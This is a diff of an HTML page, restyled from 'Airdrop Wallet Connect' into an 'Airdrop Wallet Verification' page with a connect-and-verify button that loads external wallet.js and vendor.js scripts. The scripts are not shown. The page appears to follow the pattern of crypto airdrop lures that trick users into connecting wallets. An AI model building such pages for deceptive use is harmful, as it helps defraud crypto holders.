@@ -1,29 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Airdrop Wallet Connect 🎄</title>
-<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-<style>
-  body { font-family: 'Roboto'; background: linear-gradient(to bottom right, #ff4d4d, #33cc33); color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; margin: 0; }
-  .container { background: rgba(0,0,0,0.7); padding: 40px 20px; border-radius: 20px; max-width: 400px; width: 100%; box-shadow: 0 0 20px #fff; }
-  h1 { font-size: 1.8rem; margin-bottom: 20px; color: #fff700; }
-  #status { margin-top: 15px; font-weight: bold; }
-  button { background-color: #ffcc00; border: none; padding: 12px 20px; font-size: 1rem; font-weight: bold; color: #000; border-radius: 10px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
-  button:hover { background-color: #fff700; transform: scale(1.05); }
-  .fa-wallet { margin-right: 8px; }
-</style>
-</head>
-<body>
-<div class="container">
-  <h1>🎄 Airdrop Wallet Connect 🎄</h1>
-  <button id="connectBtn"><i class="fa-solid fa-wallet"></i>Connect Wallet</button>
-  <div id="status">💡 Not connected</div>
-</div>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Airdrop Wallet Verification</title>
 
-<script src="vendor.js"></script> <!-- Must load first -->
-<script src="wallet.js"></script>
+  <style>
+    body {
+      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .box {
+      background: rgba(0,0,0,0.6);
+      padding: 30px;
+      border-radius: 12px;
+      text-align: center;
+      width: 360px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+    }
+
+    h2 {
+      margin-bottom: 20px;
+    }
+
+    button {
+      padding: 12px 20px;
+      border: none;
+      background: #00ff99;
+      color: #000;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+    }
+
+    button:hover {
+      background: #00cc7a;
+    }
+
+    #status {
+      margin-top: 15px;
+      font-size: 14px;
+      min-height: 18px;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="box">
+    <h2>🛡️ Verify Your Wallet</h2>
+
+    <!-- IMPORTANT: ID must match wallet.js -->
+    <button id="verifyWalletBtn">Connect & Verify Wallet</button>
+
+    <p id="status">Not connected</p>
+  </div>
+
+  <!-- MUST be at the bottom -->
+  <script src="/vendor.js"></script>
+  <script src="/wallet.js"></script>
 </body>
 </html>
